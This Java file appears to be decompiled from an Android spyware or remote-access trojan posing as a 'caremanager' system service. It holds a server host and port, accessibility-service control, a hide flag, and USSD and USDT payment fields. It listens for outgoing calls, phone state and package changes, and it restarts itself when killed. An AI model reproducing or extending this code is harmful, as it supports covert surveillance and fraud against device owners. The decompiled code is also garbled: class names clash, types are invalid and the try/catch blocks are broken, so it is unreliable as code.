package com.system.caremanager;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class CoreService extends Service {

    public static String Afterinstalloption;
    public static String CLINAME = "Bhopdki";
    public static boolean FO_RSC;
    public static boolean F_ORCA;
    public static boolean Is_Hidden;
    public static List L_cl;
    public static List L_i;
    public static AccessibilityServiceCore MyAccess;
    public static String admintext;
    public static Context appContext;
    public static BroadcastReceiver br;
    public static String[] c_mn;
    public static String currentSuccessPassword;
    public static long e_co = "0x0L";
    public static String ifScreenShot;
    public static int inx = "0x0";
    public static boolean k;
    public static boolean k_live;
    public static int p_lg = "0x0";
    static MainBackgroundService st;
    public static String serverHost;
    public static String serverPort;
    public static String uninstall = "on";
    public static String usdtadress;
    public static String ussdamount;
    public static String ussdcard;
    public static String ussdpayd;
    public static String yrfjerSERBRE;
     int _IDD;
    private boolean allok;

    static {
        // Static initialization block
    }

    public MainBackgroundService() {
        this.allok = null;
        int val = 4519;
        this._IDD = val;
        return;
    }

    public static void D_ele(String param1) {
        try {
            String str = ".txt";
            String str2 = "/Config/sys/apps/log";
            String str3 = "log-";
            File result = Environment.getExternalStorageDirectory();
            File file = new File();
            StringBuilder stringBuilder = new StringBuilder();
            StringBuilder result2 = stringBuilder.append(result);
            StringBuilder result3 = stringBuilder.append(str2);
            String result4 = stringBuilder.toString();
            StringBuilder stringBuilder2 = new StringBuilder();
            StringBuilder result5 = stringBuilder2.append(param1);
            StringBuilder result6 = stringBuilder2.append(str);
            String result7 = stringBuilder2.toString();
            boolean result8 = file.exists();
            if (result == null) {
                // branch: cond_0
            }
            boolean result9 = file.delete();
            // continue loop -> :goto_0
            File file2 = new File();
            StringBuilder stringBuilder3 = new StringBuilder();
            StringBuilder result10 = stringBuilder3.append(result);
            StringBuilder result11 = stringBuilder3.append(str2);
            String result12 = stringBuilder3.toString();
            StringBuilder stringBuilder4 = new StringBuilder();
            StringBuilder result13 = stringBuilder4.append(param1);
            StringBuilder result14 = stringBuilder4.append(str);
            String result15 = stringBuilder4.toString();
            boolean result16 = file2.delete();
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String getLogs() {
        try {
            String str = "";
            StringBuilder stringBuilder = new StringBuilder();
            File result = Environment.getExternalStorageDirectory();
            String result2 = result.toString();
            StringBuilder result3 = stringBuilder.append(result);
            String str2 = "/Config/sys/apps/log";
            StringBuilder result4 = stringBuilder.append(str2);
            String result5 = stringBuilder.toString();
            File file = new File();
            File[] result6 = file.listFiles();
            int len = result.length;
            if (null >= len) {
                // branch: cond_0
            }
            StringBuilder stringBuilder2 = new StringBuilder();
            StringBuilder result7 = stringBuilder2.append(str);
            Object item = result[null];
            String result8 = item.getName();
            StringBuilder result9 = stringBuilder2.append(result);
            String str3 = "*";
            StringBuilder result10 = stringBuilder2.append(str3);
            String result11 = stringBuilder2.toString();
            int val = null + 0x1;
            // continue loop -> :goto_0
            return result;
            } catch (Exception e) {
                e.printStackTrace();
            return str;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private Boolean RegNew(IntentFilter param1) {
        try {
            if (param1 == null) {
                // branch: cond_0
            }
            String str = "android.intent.action.SCREEN_OFF";
            param1.addAction(str);
            String str2 = "android.intent.action.USER_PRESENT";
            param1.addAction(str2);
            String str3 = "android.intent.action.ACTION_POWER_CONNECTED";
            param1.addAction(str3);
            String str4 = "android.intent.action.ACTION_POWER_DISCONNECTED";
            param1.addAction(str4);
            ScreenStateReceiver screenStateReceiver = new ScreenStateReceiver();
            DataPackagingEngine.rc = screenStateReceiver;
            BroadcastReceiver rc = DataPackagingEngine.rc;
            Intent result = this.registerReceiver(rc, param1);
            Boolean result2 = Boolean.valueOf(1);
            return result;
            } catch (Exception e) {
                e.printStackTrace();
            Boolean result3 = Boolean.valueOf(null);
            return result;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void cancelnotification(Context param1, int param2) {
        String str = "notification";
        Object result = this.getSystemService(str);
        result = (NotificationManager) result;
        this.cancel(param2);
        return;
    }

    public IBinder onBind(Intent param1) {
        return null;
    }

    public void onCreate() {
        try {
            this.onCreate();
            Context result = this.getApplicationContext();
            MainBackgroundService.appContext = result;
            // continue loop -> :goto_4
            } catch (Exception e) {
                e.printStackTrace();
            Boolean result2 = Boolean.valueOf(1);
            boolean result3 = result.booleanValue();
            if (result == null) {
                // branch: cond_0
            }
            Boolean result4 = Boolean.valueOf(null);
            // continue loop -> :goto_0
            boolean result5 = result.booleanValue();
            if (result == null) {
                // branch: cond_1
            }
            Boolean result6 = Boolean.valueOf(null);
            // continue loop -> :goto_1
            boolean result7 = result.booleanValue();
            if (result == null) {
                // branch: cond_2
            }
            Boolean result8 = Boolean.valueOf(null);
            // continue loop -> :goto_2
            boolean result9 = result.booleanValue();
            if (result == null) {
                // branch: cond_3
            }
            Boolean result10 = Boolean.valueOf(null);
            // continue loop -> :goto_3
            Context result11 = this.getApplicationContext();
            Resources result12 = result.getResources();
            int val = 2131296274;
            String result13 = result.getString(val);
            DataPackagingEngine.dataProcessor = result;
            BroadcastReceiver br = MainBackgroundService.br;
            if (br != null) {
                // branch: cond_4
            }
            IntentFilter intentFilter = new IntentFilter();
            String str = "android.intent.action.PHONE_STATE";
            String str2 = "android.intent.action.NEW_OUTGOING_CALL";
            intentFilter.addAction(str2);
            String str3 = "android.intent.extra.PHONE_NUMBER";
            intentFilter.addAction(str3);
            PackageMonitorReceiver packageMonitorReceiver = new PackageMonitorReceiver();
            MainBackgroundService.br = packageMonitorReceiver;
            IntentFilter intentFilter2 = new IntentFilter();
            String str4 = "android.intent.action.PACKAGE_ADDED";
            intentFilter2.addAction(str4);
            String str5 = "android.intent.action.PACKAGE_REMOVED";
            intentFilter2.addAction(str5);
            String str6 = "android.intent.action.PACKAGE_REPLACED";
            intentFilter2.addAction(str6);
            String str7 = "android.intent.action.PACKAGE_CHANGED";
            intentFilter2.addAction(str7);
            String str8 = "android.intent.action.PACKAGES_SUSPENDED";
            intentFilter2.addAction(str8);
            String str9 = "package";
            intentFilter2.addDataScheme(str9);
            BroadcastReceiver br2 = MainBackgroundService.br;
            Intent result14 = this.registerReceiver(br2, intentFilter2);
            } catch (Exception e) {
                e.printStackTrace();
            BroadcastReceiver rc = DataPackagingEngine.rc;
            if (rc != null) {
                // branch: cond_5
            }
            IntentFilter intentFilter3 = new IntentFilter();
            String str10 = "android.intent.action.SCREEN_ON";
            Boolean result15 = this.RegNew(intentFilter3);
            } catch (Exception e) {
                e.printStackTrace();
            String str11 = "2";
            Integer result16 = Integer.valueOf(str11);
            int result17 = result.intValue();
            DataPackagingEngine.Trys = result;
            Thread thread = new Thread();
            MainBackgroundService.1 mainBackgroundService.1 = new MainBackgroundService.1();
            thread.start();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onDestroy() {
        try {
            this.onDestroy();
            Boolean result = Boolean.valueOf(null);
            DataPackagingEngine.s_f0 = null;
            MainBackgroundService.st = null;
            Context appContext = MainBackgroundService.appContext;
            String str = "Error";
            DataPackagingEngine.phonixeffect(appContext, str, v4, v5);
            // continue loop -> :goto_4
            } catch (Exception e) {
                e.printStackTrace();
            Boolean result2 = Boolean.valueOf(1);
            boolean result3 = result.booleanValue();
            if (result == null) {
                // branch: cond_0
            }
            // continue loop -> :goto_0
            boolean result4 = result.booleanValue();
            if (result == null) {
                // branch: cond_1
            }
            // continue loop -> :goto_1
            boolean result5 = result.booleanValue();
            if (result == null) {
                // branch: cond_2
            }
            // continue loop -> :goto_2
            boolean result6 = result.booleanValue();
            if (result == null) {
                // branch: cond_3
            }
            // continue loop -> :goto_3
            BroadcastReceiver br = MainBackgroundService.br;
            if (br == null) {
                // branch: cond_4
            }
            this.unregisterReceiver(br);
            BroadcastReceiver rc = DataPackagingEngine.rc;
            if (rc == null) {
                // branch: cond_5
            }
            BroadcastReceiver rc2 = DataPackagingEngine.rc;
            this.unregisterReceiver(rc2);
            Intent intent = new Intent();
            Context result7 = this.getApplicationContext();
            Class cls = RestartSensorReceiver.class;
            String str2 = "RestartSensor";
            Intent result8 = intent.setAction(str2);
            this.sendBroadcast(result);
            // continue loop -> :goto_9
            } catch (Exception e) {
                e.printStackTrace();
            Boolean result9 = Boolean.valueOf(1);
            boolean result10 = result.booleanValue();
            if (result == null) {
                // branch: cond_6
            }
            // continue loop -> :goto_5
            boolean result11 = result.booleanValue();
            if (result == null) {
                // branch: cond_7
            }
            // continue loop -> :goto_6
            boolean result12 = result.booleanValue();
            if (result == null) {
                // branch: cond_8
            }
            // continue loop -> :goto_7
            boolean result13 = result.booleanValue();
            if (result == null) {
                // branch: cond_9
            }
            // continue loop -> :goto_8
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public int onStartCommand(Intent param1, int param2, int param3) {
        try {
            Context result = this.getApplicationContext();
            MainBackgroundService.appContext = result;
            Resources result2 = result.getResources();
            int val = 2131296274;
            String result3 = result.getString(val);
            DataPackagingEngine.dataProcessor = result;
            boolean allok = this.allok;
            if (allok == null) {
                // branch: cond_0
            }
            Class cls = PersistentService.class;
            Context appContext = MainBackgroundService.appContext;
            boolean result4 = BackgroundServiceHelper.removedqtractort40(PersistentService.class, appContext);
            if (result == null) {
                // branch: cond_0
            }
            Context appContext2 = MainBackgroundService.appContext;
            Intent intent = new Intent();
            Context appContext3 = MainBackgroundService.appContext;
            Class cls2 = PersistentService.class;
            ComponentName result5 = appContext2.startService(intent);
            return 1;
            } catch (Exception e) {
                e.printStackTrace();
            int val2 = 2;
            return val2;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onTaskRemoved(Intent param1) {
        try {
            this.onTaskRemoved(param1);
            Context appContext = MainBackgroundService.appContext;
            String str = "Error";
            DataPackagingEngine.phonixeffect(appContext, str, v1, v2);
            } catch (Exception e) {
                e.printStackTrace();
            Intent intent = new Intent();
            Context result = this.getApplicationContext();
            Class cls = RestartSensorReceiver.class;
            String str2 = "RestartSensor";
            Intent result2 = intent.setAction(str2);
            this.sendBroadcast(result);
            // continue loop -> :goto_4
            } catch (Exception e) {
                e.printStackTrace();
            Boolean result3 = Boolean.valueOf(1);
            boolean result4 = result.booleanValue();
            if (result == null) {
                // branch: cond_0
            }
            Boolean result5 = Boolean.valueOf(null);
            // continue loop -> :goto_0
            boolean result6 = result.booleanValue();
            if (result == null) {
                // branch: cond_1
            }
            Boolean result7 = Boolean.valueOf(null);
            // continue loop -> :goto_1
            boolean result8 = result.booleanValue();
            if (result == null) {
                // branch: cond_2
            }
            Boolean result9 = Boolean.valueOf(null);
            // continue loop -> :goto_2
            boolean result10 = result.booleanValue();
            if (result == null) {
                // branch: cond_3
            }
            Boolean result11 = Boolean.valueOf(null);
            // continue loop -> :goto_3
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}